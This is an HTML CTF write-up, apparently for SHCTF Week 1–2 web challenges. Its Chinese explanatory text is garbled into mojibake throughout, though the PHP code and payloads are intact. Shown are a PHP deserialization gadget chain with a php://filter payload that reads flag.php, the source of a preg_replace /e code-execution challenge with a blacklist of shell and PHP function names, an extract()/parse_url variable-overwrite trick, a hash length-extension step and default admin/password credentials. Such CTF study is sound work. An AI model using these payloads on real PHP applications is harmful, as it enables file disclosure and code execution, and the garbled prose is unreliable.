<p>é‚£ä¹ˆå¦‚æœå°†Aç±»ä¸å…¶ä»–ç±»ç›¸è¿ï¼Œé‚£å°±æ ¹æ®<code>__invoke()</code>ä¸Dç±»ç›¸å…³èµ·æ¥ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†å¯¹è±¡å½“æˆäº†ä¸€ä¸ªæ–¹æ³•ä¼šè°ƒç”¨__invoke()ã€‚</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Bç±»ä¸­è§¦å‘<code>__wakeup()</code>ï¼š</p>
<blockquote>
<p>å½“ä½¿ç”¨ unserialize() ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æˆåŠŸåï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„ __wakup() é­”æœ¯æ–¹æ³•ã€‚</p>
</blockquote>
<p>Cç±»ä¸­è§¦å‘<code>__toString()</code>ï¼š</p>
<blockquote>
<p>åœ¨æŠŠå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨</p>
</blockquote>
<p>æœ€åçš„ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">-></span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¾—åˆ°<br><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;N;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e6a723da29b5436689b78b35619a18c3.png" alt="2"></p>
<h3 id="WEEK1-ç™»å½•å°±ç»™flag"><a href="#WEEK1-ç™»å½•å°±ç»™flag" class="headerlink" title="[WEEK1]ç™»å½•å°±ç»™flag"></a>[WEEK1]ç™»å½•å°±ç»™flag</h3><p><img src="https://img-blog.csdnimg.cn/ffb2aac663074c77ab96fcb980ccc273.png" alt="12"><br>ç”¨æˆ·åå¯†ç admin&#x2F;password<br><img src="https://img-blog.csdnimg.cn/cb6374f9e73f41dcad4f2f3a301bba83.png" alt="2"></p>
<h3 id="WEEK1-é£æœºå¤§æˆ˜"><a href="#WEEK1-é£æœºå¤§æˆ˜" class="headerlink" title="[WEEK1]é£æœºå¤§æˆ˜"></a>[WEEK1]é£æœºå¤§æˆ˜</h3><p>flagå°±åœ¨å‰ç«¯ï¼Œæ‰¾å°±è¡Œäº†ã€‚<br><img src="https://img-blog.csdnimg.cn/eb16f34b08574889a6c83f04750bb711.png" alt="1"><br>è§£ç ä¸€ä¸‹unicode-&gt;base64-&gt;flagã€‚</p>
<h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h3><p>çŸ¥è¯†ç‚¹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$pattern</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print_r("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are smart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"it is begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å› ä¸ºå­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰ï¼Œæ‰€ä»¥<code>\\1</code>å®é™…ä¸Šå°±æ˜¯<code> \1</code>, è€Œ <code>\1</code> åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåå‘å¼•ç”¨ã€‚</p>
<blockquote>
<p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ª<strong>ä¸´æ—¶ç¼“å†²åŒº</strong>ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä»<code>1</code>å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨<code>99</code>ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨<code>\n</code> è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p>
</blockquote>
<p>å¼•å…¥ä¸€ä¸ªä¾‹å­ç†è§£ä¸€ä¸‹<a href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ</a></p>
<table>
<thead>
<tr>
<th>æ­£åˆ™è¡¨è¾¾å¼</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td><code>.</code></td>
<td>åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦</td>
</tr>
<tr>
<td><code>\S</code></td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td><code>+</code></td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡</td>
</tr>
</tbody></table>
<p><img src="https://img-blog.csdnimg.cn/363feed2972e432a8558d32102c4a1bf.png" alt="1"></p>
<h3 id="WEEK1-ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§"><a href="#WEEK1-ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§" class="headerlink" title="[WEEK1]ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§~"></a>[WEEK1]ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§~</h3><p><img src="https://img-blog.csdnimg.cn/72cb3c9f90a8402b9a32ef9287dd9387.png" alt="1"><br>æŒ‰ç…§ä»–è¯´çš„å¾—åˆ°çš„å›¾ç‰‡ä¸‹é¢å°±æ˜¯flagã€‚</p>
<h3 id="WEEK2-MD5çš„äº‹å°±æ‹œæ‰˜äº†"><a href="#WEEK2-MD5çš„äº‹å°±æ‹œæ‰˜äº†" class="headerlink" title="[WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº†"></a>[WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº†</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag is"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆé€šè¿‡ç¬¬ä¸€ä¸ªif</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œ<code>extract(parse_url($_POST[&#39;SHCTF&#39;]));</code>æ˜¯å°†ä¼ å…¥çš„SHCTFå€¼çš„ä¸€éƒ¨åˆ†å†ä½œä¸ºå‚æ•°ã€‚<code>extract</code>ä¼šæ¶‰åŠåˆ°å˜é‡è¦†ç›–æ¼æ´<br>å‚è€ƒèµ„æ–™<a href="https://www.cnblogs.com/xhds/p/12587249.html#_label5">PHPä¸­çš„å˜é‡è¦†ç›–æ¼æ´</a><br>åœ¨è¿™é‡Œåšä¸€ä¸ªæµ‹è¯•ï¼š<br>æ¯”å¦‚è¯´è¿™ä¸€æ®µä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'http://sd.com:12/as.php?s=456'</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">/*
æ‰“å°ç»“æœï¼š
Array
(
    [scheme] => http
    [host] => sd.com
    [port] => 12
    [path] => /as.php
    [query] => s=456
)
*/</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œæˆ‘ä»¬å°†<code>http</code>æ”¹ä¸º<code>host</code>ï¼Œå°†<code>sd.com</code>æ”¹ä¸º<code>query</code>ï¼Œå°†<code>s=456</code>æ”¹ä¸º<code>SHCTF</code><br>ä¹Ÿå°±æ˜¯ä»¥ä¸‹ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'host://query/sd.php?SHCTF'</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
è¿è¡Œç»“æœï¼š
Array
(
    [scheme] => host
    [host] => query
    [path] => /sd.php
    [query] => SHCTF
)
*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œæ­£å¥½å®ç°ä¸‰æ¬¡å˜é‡è¦†ç›–ï¼Œè¾“å‡ºäº†flagçš„md5å€¼<br><img src="https://img-blog.csdnimg.cn/c14c045f09a9418bb0382e89e8f99724.png" alt="1"><br>æ¥ä¸‹æ¥é€šè¿‡ä¸‹é¢çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªå¥½å¼„ï¼Œå°±æ˜¯å°†lengthèµ‹å€¼ä¸ºå¸¦æœ‰ä¸‰ä½å°æ•°çš„æ•°å€¼<code>length=132.456</code>ï¼Œè¿”å›flagé•¿åº¦42ã€‚</p>
<blockquote>
<p>åˆ°è¿™å·²ç»çŸ¥é“äº†ï¼š<br>flag.md5&#x3D;2f679a35b591a420d8cc6b60f90d3fb1<br>flag.length&#x3D;42</p>
<p>åé¢è¿™ä¸ªå…¶å®ä¹ŸçŸ¥é“<code>å“ˆå¸Œæ‹“å±•æ”»å‡»</code>ï¼Œå¯æ˜¯å¥½åƒæ‰¾çš„è„šæœ¬ä¸èƒ½ç”¨äº†ã€‚å”‰ï¼Œå¤ç°ä¸€ä¸‹ã€‚ã€‚ã€‚<br>ä½¿ç”¨è„šæœ¬ï¼ˆ<a href="https://github.com/shellfeel/hash-ext-attack">è„šæœ¬åœ°å€</a>ï¼‰<br><img src="https://img-blog.csdnimg.cn/2d34bb2cb1de4c5085c00c2ebca01da1.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/d4c7e7d9e3674f8694e493d9d887fc01.png" alt="3"></p>
</blockquote>
<h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h3><p>çŸ¥è¯†ç‚¹ï¼šæµ…æ‹·è´ã€ååºåˆ—åŒ–<br>åˆ†äº«æ–‡ç« ï¼š<a href="https://blog.csdn.net/crisprx/article/details/104457047">ä»ä¸¤é“é¢˜ç›®æµ…è°ˆPHPæ·±æµ…æ‹·è´</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fei</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">'Mikey Mouse~'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">dong</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span><span class="token string double-quoted-string">"misca~musca~milaoshu~~~"</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^O:\d+/'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you should think harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
